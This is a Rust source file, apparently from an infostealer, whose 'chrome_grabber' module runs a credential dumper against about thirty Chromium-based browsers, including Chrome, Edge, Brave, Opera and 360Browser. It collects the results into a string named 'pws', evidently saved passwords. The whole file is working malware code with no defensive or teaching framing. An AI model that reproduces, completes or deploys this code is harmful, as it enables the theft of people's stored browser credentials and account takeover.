

use crate::chrome_grabber::dumper::Dumper;
use std::collections::HashMap;
use crate::chrome_grabber::dumper::DumperError;
pub type DumperResult<T> = Result<T, DumperError>;




pub fn chrome_main() -> String {

        let mut hm = HashMap::new();
        hm.insert("edge", Dumper::new("Edge", "Microsoft"));
        hm.insert("chromium", Dumper::new("", "Chromium"));
        hm.insert("7star", Dumper::new("7Star", "7Star"));
        hm.insert("amigo", Dumper::new("", "Amigo"));
        hm.insert("brave", Dumper::new("Brave-Browser", "BraveSoftware"));
        hm.insert("centbrowser", Dumper::new("", "CentBrowser"));
        hm.insert("chedot", Dumper::new("", "Chedot"));
        hm.insert("chrome_canary", Dumper::new("Chrome SxS", "Google"));
        hm.insert("coccoc", Dumper::new("Browser", "CocCoc"));
        hm.insert("dragon", Dumper::new("Dragon", "Comodo"));
        hm.insert("elements-browser", Dumper::new("", "Elements Browser"));
        hm.insert("epic-privacy-browser",Dumper::new("", "Epic Privacy Browser"));
        hm.insert("chrome", Dumper::new("Chrome", "Google"));
        hm.insert("kometa", Dumper::new("", "Kometa"));
        hm.insert("orbitum", Dumper::new("", "Orbitum"));
        hm.insert("sputnik", Dumper::new("Sputnik", "Sputnik"));
        hm.insert("torch", Dumper::new("", "Torch"));
        hm.insert("ucozmedia", Dumper::new("Uran", "uCozMedia"));
        hm.insert("vivaldi", Dumper::new("", "Vivaldi"));
        hm.insert("atom-mailru", Dumper::new("Atom", "Mail.Ru"));
        hm.insert("opera", Dumper::new("Opera Software", "Opera Stable")); 
        hm.insert("opera-gx", Dumper::new("Opera Software", "Opera GX Stable"));
        hm.insert("ChromePlus", Dumper::new("MappleStudio", "ChromePlus"));
        hm.insert("Iridium", Dumper::new("Iridium", "Iridium"));
        hm.insert("Iridium", Dumper::new("", "Iridium"));
        hm.insert("fenrir-inc", Dumper::new("sleipnir5", "settings"));
        hm.insert("catalinagroup", Dumper::new("CatalinaGroup", "Citrio"));
        hm.insert("Coowoo", Dumper::new("", "Coowoo"));
        hm.insert("liebao", Dumper::new("", "liebao"));
        hm.insert("qip-surf", Dumper::new("", "Qip Surf"));
        hm.insert("360browser", Dumper::new("360Browser", "Browser"));
    let browsers = &mut hm.clone();

    let opt_browsers = browsers.keys().map(|v| v.to_string()).collect::<Vec<_>>();
    

    let data = opt_browsers
        .into_iter()
        .filter_map(|v| browsers.get(v.as_str()).cloned())
        .map(|mut v| v.dump().map(|_| v))
        .filter_map(|v| v.ok())
        .collect::<Vec<_>>();


    
    let pws = format!("{:#?}", data);
    
    
    pws
}
